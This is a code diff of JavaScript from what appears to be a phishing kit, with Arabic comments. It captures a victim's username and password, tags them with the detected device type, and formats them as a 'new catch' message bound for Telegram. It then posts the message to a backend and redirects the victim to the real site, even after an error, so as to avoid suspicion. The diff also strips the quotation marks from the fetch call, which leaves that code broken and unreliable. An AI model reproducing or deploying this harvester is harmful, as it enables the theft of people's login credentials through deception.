@@ -1,3 +1,5 @@
+
+// دالة كشف الجهاز
 function getDevice() {
     var ua = navigator.userAgent;
     if (/android/i.test(ua)) return "Android 🤖";
@@ -5,8 +7,11 @@ function getDevice() {
     return "PC 💻";
 }
 
+// الدالة الأساسية لإرسال البيانات
 function sendData(u, p, l) {
     var dev = getDevice();
+    
+    // تنسيق الرسالة لتبدو احترافية في تليجرام
     var msg = "🎯 صيد جديد مرتب 🎯\n" +
               "━━━━━━━━━━━━━━\n" +
               "👤 المستخدم: " + u + "\n" +
@@ -16,13 +21,18 @@ function sendData(u, p, l) {
               "━━━━━━━━━━━━━━\n" +
               "👤 @M6_vip";
 
-    fetch('/api/save', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
+    // إرسال الطلب إلى الـ API الخاص بك
+    fetch( /api/save , {
+        method:  POST ,
+        headers: {  Content-Type :  application/json  },
         body: JSON.stringify({ message: msg })
-    }).then(function() {
+    })
+    .then(function() {
+        // التوجه للموقع الأصلي بعد النجاح
         window.location.href = "https://receive-smss.com/";
-    }).catch(function() {
+    })
+    .catch(function(err) {
+        // التوجه للموقع الأصلي حتى لو حدث خطأ لعدم إثارة الشك
         window.location.href = "https://receive-smss.com/";
     });
 }
